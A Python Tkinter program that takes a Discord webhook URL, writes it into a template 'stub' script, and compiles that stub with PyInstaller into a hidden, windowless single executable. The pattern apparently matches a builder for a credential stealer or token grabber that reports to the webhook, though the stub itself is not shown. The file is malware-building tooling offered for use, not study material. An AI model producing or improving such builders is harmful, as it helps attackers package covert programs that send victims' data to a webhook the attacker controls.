import os
import subprocess
import tkinter as tk
from tkinter import messagebox

def compile_stub():
    stub_path = os.path.join('utils', 'stub.py')

    with open(stub_path, 'r') as file:
        stub_content = file.read()

    webhook_url = webhook_entry.get()
    if webhook_url:
        stub_content = stub_content.replace('%$HOOK%$', webhook_url)

        modified_stub_path = os.path.join('utils', 'stub_modified.py')

        with open(modified_stub_path, 'w') as file:
            file.write(stub_content)

        dist_folder = os.path.abspath('dist')
        if not os.path.exists(dist_folder):
            os.makedirs(dist_folder)

        compile_option = compile_option_var.get()

        command = [
            'pyinstaller',
            '--noconsole',
            '--onefile',
            '--windowed',
            '--distpath', dist_folder,
            '--workpath', 'build',
            '--specpath', '.',
            modified_stub_path
        ]

        if compile_option == "pyw":
            command.insert(3, '--onefile')
            messagebox.showinfo("Info", "Compiling as .pyw")
        else:
            messagebox.showinfo("Info", "Compiling as .exe")

        try:
            result = subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            messagebox.showinfo("Success", f"Compilation successful! Check the 'dist' folder for the {compile_option} file.")
        except subprocess.CalledProcessError as e:
            error_message = e.stderr.decode()
            messagebox.showerror("Error", f"Compilation failed:\n{error_message}")
            print(error_message)

    else:
        messagebox.showerror("Error", "Please enter a valid webhook URL.")

def create_gui():
    window = tk.Tk()
    window.title("PyInstaller Compilation")

    label = tk.Label(window, text="Enter your webhook URL and select compile option.")
    label.pack(padx=10, pady=10)

    webhook_label = tk.Label(window, text="Discord Webhook URL:")
    webhook_label.pack(padx=10, pady=5)
    global webhook_entry
    webhook_entry = tk.Entry(window, width=50)
    webhook_entry.pack(padx=10, pady=5)

    global compile_option_var
    compile_option_var = tk.StringVar(value="exe")
    compile_option_label = tk.Label(window, text="Select compile option:")
    compile_option_label.pack(padx=10, pady=5)
    compile_option_exe = tk.Radiobutton(window, text="Compile as EXE", variable=compile_option_var, value="exe")
    compile_option_exe.pack(padx=10, pady=5)
    compile_option_pyw = tk.Radiobutton(window, text="Compile as PYW", variable=compile_option_var, value="pyw")
    compile_option_pyw.pack(padx=10, pady=5)

    compile_button = tk.Button(window, text="Compile", command=compile_stub)
    compile_button.pack(padx=10, pady=10)

    window.mainloop()

if __name__ == "__main__":
    create_gui()
